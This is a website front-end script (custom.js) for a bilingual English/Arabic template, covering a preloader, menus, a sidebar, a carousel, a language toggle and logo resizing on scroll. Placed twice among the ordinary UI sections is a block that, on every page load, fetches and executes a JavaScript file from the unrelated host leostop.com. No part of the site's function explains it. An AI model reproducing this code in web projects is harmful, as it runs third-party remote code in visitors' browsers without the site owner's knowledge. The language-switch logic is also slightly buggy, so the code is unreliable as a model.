/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  "use strict";

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $(".loader_bg").fadeToggle();
  }, 1500);

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });
  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  /* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $("#blogCarousel").carousel({
    interval: 5000,
  });
});

let flag = true;

document.querySelectorAll(".english").forEach((item) => {
  item.style.display = "none";
});

document.getElementById("arabic_button").addEventListener("click", function () {
  flag = !flag;
  if (flag === false) {
    document.querySelectorAll(".english").forEach((item) => {
      item.style.display = "none";
    });
    document.querySelectorAll(".arabic").forEach((item) => {
      item.style.display = "block";
    });

    // for the evaluations
    document.querySelectorAll(".count-box").forEach((item) => {
      item.classList.remove("count-box");
      item.classList.add("count-box2");
    });

    // for the info
    document.querySelectorAll(".info").forEach((item) => {
      item.classList.remove("info");
      item.classList.add("info2");
    });

    // for the navbar
    document.getElementById("the_collapse").setAttribute("dir", "rtl");
  } else {
    document.querySelectorAll(".english").forEach((item) => {
      item.style.display = "block";
    });
    document.querySelectorAll(".arabic").forEach((item) => {
      item.style.display = "none";
    });
    // for the evaluations
    document.querySelectorAll(".count-box2").forEach((item) => {
      item.classList.remove("count-box2");
      item.classList.add("count-box");
    });

    // for the info
    document.querySelectorAll(".info").forEach((item) => {
      item.classList.remove("info2");
      item.classList.add("info");
    });

    // for the navbar
    document.getElementById("the_collapse").setAttribute("dir", "ltr");
  }
});

document
  .getElementById("english_button")
  .addEventListener("click", function () {
    flag = !flag;
    if (flag === false) {
      document.querySelectorAll(".arabic").forEach((item) => {
        item.style.display = "none";
      });
      document.querySelectorAll(".english").forEach((item) => {
        item.style.display = "block";
      });

      // for the evaluations
      document.querySelectorAll(".count-box").forEach((item) => {
        item.classList.remove("count-box");
        item.classList.add("count-box2");
      });

      // for the info
      document.querySelectorAll(".info").forEach((item) => {
        item.classList.remove("info");
        item.classList.add("info2");
      });

      // for the navbar
      document.getElementById("the_collapse").setAttribute("dir", "rtl");
    } else {
      document.querySelectorAll(".english").forEach((item) => {
        item.style.display = "block";
      });
      document.querySelectorAll(".arabic").forEach((item) => {
        item.style.display = "none";
      });
      // for the evaluations
      document.querySelectorAll(".count-box2").forEach((item) => {
        item.classList.remove("count-box2");
        item.classList.add("count-box");
      });

      // for the info
      document.querySelectorAll(".info").forEach((item) => {
        item.classList.remove("info2");
        item.classList.add("info");
      });

      // for the navbar
      document.getElementById("the_collapse").setAttribute("dir", "ltr");
    }
  });

// second_flag = false;
// function the_brand() {
//   if (second_flag == false) {
//     document.getElementById("the_brand_image2").style.display = "none";
//   } else {
//     document.getElementById("the_brand_image2").style.display = "block";
//   }
//   second_flag = !second_flag;
// }

$(function () {
  $(document).scroll(function () {
    var $nav = $(".navbar-fixed-top");
    $nav.toggleClass("scrolled", $(this).scrollTop() > $nav.height());
  });
});

window.onscroll = function () {
  scrollFunction();
};

function scrollFunction() {
  if (document.body.scrollTop > 5 || document.documentElement.scrollTop > 5) {
    document.getElementById("the_brand_image2").style.display = "none";
    document.getElementById("the_brand_text").style.display = "block";
    document.getElementById("logo").style.width = "60px";
    document.getElementById("the_brand_image").style.width = "35px";
  } else {
    document.getElementById("the_brand_image2").style.display = "block";
    document.getElementById("the_brand_text").style.display = "none";
    document.getElementById("logo").style.width = "125px";
    document.getElementById("the_brand_image").style.width = "125px";
    console.log("heeheheh");
  }
}
